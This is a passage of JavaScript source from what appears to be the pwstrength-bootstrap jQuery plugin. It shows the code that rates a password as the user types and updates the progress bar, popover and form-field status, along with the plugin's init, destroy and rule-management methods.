                !options.ui.showVerdictsInsideProgressBar &&
                verdictText.length > 0) {
                html = "<h5><span class='password-verdict'>" + verdictText +
                    "</span></h5>";
                hide = false;
            }
            if (options.ui.showErrors) {
                if (options.instances.errors.length > 0) {
                    hide = false;
                }
                html += options.ui.popoverError(options.instances.errors);
            }

            if (hide) {
                $el.popover("hide");
                return;
            }

            if (options.ui.bootstrap2) { popover = $el.data("popover"); }

            if (popover.$arrow && popover.$arrow.parents("body").length > 0) {
                $el.find("+ .popover .popover-content").html(html);
            } else {
                // It's hidden
                popover.options.content = html;
                $el.popover("show");
            }
        };

        ui.updateFieldStatus = function (options, $el, cssClass) {
            var targetClass = options.ui.bootstrap2 ? ".control-group" : ".form-group",
                $container = $el.parents(targetClass).first();

            $.each(statusClasses, function (idx, css) {
                if (!options.ui.bootstrap2) { css = "has-" + css; }
                $container.removeClass(css);
            });

            cssClass = statusClasses[cssClass];
            if (!options.ui.bootstrap2) { cssClass = "has-" + cssClass; }
            $container.addClass(cssClass);
        };

        ui.percentage = function (score, maximun) {
            var result = Math.floor(100 * score / maximun);
            result = result < 0 ? 0 : result;
            result = result > 100 ? 100 : result;
            return result;
        };

        ui.getVerdictAndCssClass = function (options, score) {
            var cssClass, verdictText, level;

            if (score <= 0) {
                cssClass = 0;
                level = -1;
                verdictText = options.ui.verdicts[0];
            } else if (score < options.ui.scores[0]) {
                cssClass = 0;
                level = 0;
                verdictText = options.ui.verdicts[0];
            } else if (score < options.ui.scores[1]) {
                cssClass = 0;
                level = 1;
                verdictText = options.ui.verdicts[1];
            } else if (score < options.ui.scores[2]) {
                cssClass = 1;
                level = 2;
                verdictText = options.ui.verdicts[2];
            } else if (score < options.ui.scores[3]) {
                cssClass = 1;
                level = 3;
                verdictText = options.ui.verdicts[3];
            } else {
                cssClass = 2;
                level = 4;
                verdictText = options.ui.verdicts[4];
            }

            return [verdictText, cssClass, level];
        };

        ui.updateUI = function (options, $el, score) {
            var cssClass, barPercentage, verdictText;

            cssClass = ui.getVerdictAndCssClass(options, score);
            verdictText = cssClass[0];
            cssClass = cssClass[1];

            if (options.ui.showProgressBar) {
                barPercentage = ui.percentage(score, options.ui.scores[3]);
                ui.updateProgressBar(options, $el, cssClass, barPercentage);
                if (options.ui.showVerdictsInsideProgressBar) {
                    ui.updateVerdict(options, $el, verdictText);
                }
            }

            if (options.ui.showStatus) {
                ui.updateFieldStatus(options, $el, cssClass);
            }

            if (options.ui.showPopover) {
                ui.updatePopover(options, $el, verdictText);
            } else {
                if (options.ui.showVerdicts && !options.ui.showVerdictsInsideProgressBar) {
                    ui.updateVerdict(options, $el, verdictText);
                }
                if (options.ui.showErrors) {
                    ui.updateErrors(options, $el);
                }
            }
        };
    }(jQuery, ui));

    // Source: src/methods.js


    var methods = {};

    (function ($, methods) {
        "use strict";
        var onKeyUp, applyToAll;

        onKeyUp = function (event) {
            var $el = $(event.target),
                options = $el.data("pwstrength-bootstrap"),
                word = $el.val(),
                userInputs,
                verdictText,
                verdictLevel,
                score;

            if (options === undefined) { return; }

            options.instances.errors = [];
            if (options.common.zxcvbn) {
                userInputs = [];
                $.each(options.common.userInputs, function (idx, selector) {
                    userInputs.push($(selector).val());
                });
                userInputs.push($(options.common.usernameField).val());
                score = zxcvbn(word, userInputs).entropy;
            } else {
                score = rulesEngine.executeRules(options, word);
            }
            ui.updateUI(options, $el, score);
            verdictText = ui.getVerdictAndCssClass(options, score);
            verdictLevel = verdictText[2];
            verdictText = verdictText[0];

            if (options.common.debug) { console.log(score + ' - ' + verdictText); }

            if ($.isFunction(options.common.onKeyUp)) {
                options.common.onKeyUp(event, {
                    score: score,
                    verdictText: verdictText,
                    verdictLevel: verdictLevel
                });
            }
        };

        methods.init = function (settings) {
            this.each(function (idx, el) {
                // Make it deep extend (first param) so it extends too the
                // rules and other inside objects
                var clonedDefaults = $.extend(true, {}, defaultOptions),
                    localOptions = $.extend(true, clonedDefaults, settings),
                    $el = $(el);

                localOptions.instances = {};
                $el.data("pwstrength-bootstrap", localOptions);
                $el.on("keyup", onKeyUp);
                $el.on("change", onKeyUp);
                $el.on("onpaste", onKeyUp);

                ui.initUI(localOptions, $el);
                if ($.trim($el.val())) { // Not empty, calculate the strength
                    $el.trigger("keyup");
                }

                if ($.isFunction(localOptions.common.onLoad)) {
                    localOptions.common.onLoad();
                }
            });

            return this;
        };

        methods.destroy = function () {
            this.each(function (idx, el) {
                var $el = $(el),
                    options = $el.data("pwstrength-bootstrap"),
                    elements = ui.getUIElements(options, $el);
                elements.$progressbar.remove();
                elements.$verdict.remove();
                elements.$errors.remove();
                $el.removeData("pwstrength-bootstrap");
            });
        };

        methods.forceUpdate = function () {
            this.each(function (idx, el) {
                var event = { target: el };
                onKeyUp(event);
            });
        };

        methods.addRule = function (name, method, score, active) {
            this.each(function (idx, el) {
                var options = $(el).data("pwstrength-bootstrap");

                options.rules.activated[name] = active;
                options.rules.scores[name] = score;
                options.rules.extra[name] = method;
            });
        };

        applyToAll = function (rule, prop, value) {
            this.each(function (idx, el) {
                $(el).data("pwstrength-bootstrap").rules[prop][rule] = value;
            });
        };

        methods.changeScore = function (rule, score) {
            applyToAll.call(this, rule, "scores", score);
        };

        methods.ruleActive = function (rule, active) {
            applyToAll.call(this, rule, "activated", active);
        };

        $.fn.pwstrength = function (method) {
            var result;

            if (methods[method]) {
                result = methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
            } else if (typeof method === "object" || !method) {
                result = methods.init.apply(this, arguments);
            } else {
                $.error("Method " + method + " does not exist on jQuery.pwstrength-bootstrap");
            }

            return result;
        };
    }(jQuery, methods));
}(jQuery));
